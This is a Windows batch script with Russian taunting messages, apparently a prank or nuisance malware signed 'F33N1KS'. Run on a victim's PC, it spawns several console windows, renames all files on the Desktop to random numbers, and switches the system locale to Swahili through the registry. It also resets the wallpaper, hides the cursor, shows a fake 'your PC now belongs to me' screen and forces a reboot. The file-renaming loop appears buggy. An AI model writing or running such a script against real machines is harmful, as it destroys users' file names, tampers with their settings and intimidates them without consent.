@echo off
title АПОКАЛИПСИС ОТ F33N1KS
color 0a
echo ДОБРО ПОЖАЛОВАТЬ В АД, МАЛЫШ :3
timeout /t 3 /nobreak >nul

:start
start cmd
start cmd
start cmd
start cmd
start cmd
timeout /t 2 /nobreak >nul

:rename
cd %userprofile%\Desktop
for %%f in (*.*) do (
    set /a rand=%random%%%100000
    ren "%%f" "%%rand%%"
)
timeout /t 10 /nobreak >nul

:voice
reg add "HKCU\Control Panel\International" /v LocaleName /t REG_SZ /d "sw-KE" /f
timeout /t 5 /nobreak >nul

:wallpaper
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Windows\Web\Wallpaper\Windows\img0.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
timeout /t 8 /nobreak >nul

:mouse
powershell -command "Add-Type -TypeDefinition @' 
using System; using System.Runtime.InteropServices; 
public class Mouse { [DllImport(\"user32.dll\")] public static extern int ShowCursor(bool bShow); }
'@; [Mouse]::ShowCursor(0); Start-Sleep -Milliseconds 2000; [Mouse]::ShowCursor(1)"
timeout /t 10 /nobreak >nul

:bsod
start cmd /c "color 1f & cls & echo ======================================= & echo    ВНИМАНИЕ! ОБНАРУЖЕН F33N1KS & echo ======================================= & echo  ^|  Ваш ПК теперь принадлежит мне, детка ^| & echo  ^|   ^:3^   ^| & echo ======================================= & pause >nul"
timeout /t 20 /nobreak >nul

:final
cls
echo ===============================================
echo          ТЫ БЫЛ В АДУ, МАЛЫШ :3
echo ===============================================
echo    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
echo    ⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿
echo    ⣿⣿⠋...  МЫ ЕЩЁ ВСТРЕТИМСЯ ...
echo    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
echo ===============================================
shutdown /r /f /t 5